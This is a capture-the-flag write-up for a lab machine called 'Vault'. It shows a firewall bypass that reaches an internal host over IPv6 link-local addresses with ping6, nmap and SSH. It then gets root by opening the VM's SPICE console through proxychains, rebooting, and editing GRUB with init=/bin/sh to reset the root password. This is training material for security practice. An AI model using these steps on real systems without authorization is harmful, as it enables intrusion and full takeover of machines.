# Alternative way to exploit Vault

## Getting to 192.168.5.2 with IPv6

Instead of using the SSH service on port 987 with the source port 53 to get access to 192.168.5.2, it is possible to use **IPv6** as the firewall has no rules for that.

Pinging IPv6 Multicast Address:
```markdown
ping6 -I ens3 ff02::1
```

IPv6 neighbors:
```markdown
ip -6 neigh
```
```markdown
fe80::5054:ff:fe3a:3bd5 dev ens3 lladdr 52:54:00:3a:3b:d5 STALE
fe80::5054:ff:fee1:7441 dev ens3 lladdr 52:54:00:e1:74:41 STALE
fe80::5054:ff:fec6:7066 dev ens3 lladdr 52:54:00:c6:70:66 STALE
```

Comparing with the **ARP** neighbors:
```markdown
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.122.5            ether   52:54:00:3a:3b:d5   C                     ens3
192.168.122.1            ether   fe:54:00:17:ab:49   C                     ens3
```

The first IPv6 has the MAC address of 192.168.122.5 and we don't know the other ones yet.

Scanning the unknown IPv6 addresses with **Nmap**:
```markdown
nmap -6 fe80::5054:ff:fee1:7441%ens3
```
```markdown
All 1000 scanned ports on fe80::5054:ff:fee1:7441 are closed
MAC Address: 52:54:00:E1:74:41 (QEMU virtual NIC)
```

```markdown
nmap -6 fe80::5054:ff:fec6:7066%ens3
```
```markdown
PORT    STATE SERVICE
987/tcp open  unknown
MAC Address: 52:54:00:C6:70:66 (QEMU virtual NIC)
```

So _fe80::5054:ff:fec6:7066_ has port 987 open and thus is _"The Vault"_ SSH service which can be accessed with the earlier found password for _dave_:
```markdown
ssh -p987 dave@fe80::5054:ff:fec6:7066%ens3
```

## Privilege Escalation

There is another way to escalate privileges to _root_.
When enumerating the listening ports on the initial client _10.10.10.109_ with `netstat -alnp`, it shows that port 5900, 5901 and 5902 are listening:
```markdown
Proto   Local Address       Foreign Address     State
tcp     127.0.0.1:5902      0.0.0.0:*           LISTEN
tcp     127.0.0.1:5900      0.0.0.0:*           LISTEN
tcp     127.0.0.1:5901      0.0.0.0:*           LISTEN
```

Searching the processes for these ports:
```markdown
ps ef | grep 5902
```

Only port 5902 shows the result, that _libvirt+_ is using this port as the **spice** service:
```markdown
libvirt+ - qemu-system-x86_64 - -spice port=5902,addr=127.0.0.1
```

The service [Spice](https://www.spice-space.org/spice-user-manual.html) is a solution to gain access to the remote display and devices of virtual clients like **VNC**.

As this box has no real display, the connection to **spice** has to get through our local box with **proxychains** configured accordingly:
```markdown
proxychains remote-viewer spice://127.0.0.1:5900

proxychains remote-viewer spice://127.0.0.1:5901

proxychains remote-viewer spice://127.0.0.1:5902
```

> NOTE: `remote-viewer` can be installed with `apt install virt-viewer`

- Port 5900 is calling itself _"Firewall"_
- Port 5901 is calling itself _"vault"_

The next steps are rebooting the box and changing the password of root by modifying the **GRUB** configuration. This is normal procedure when the [root password is forgotten](https://itsfoss.com/how-to-hack-ubuntu-password/).

Rebooting the _vault_:
```markdown
Send Keys --> Ctrl+Alt+Del
```

Before it boots, by pressing _"e"_ the **GRUB** configuration has to be modified:
```markdown
(...) rw init=/bin/sh (...)

Ctrl+x
```

Changing the password:
```markdown
passwd
```

Rebooting again:
```markdown
Send Keys --> Ctrl+Alt+Del
```

After the reboot, the root password is what we changed it to.
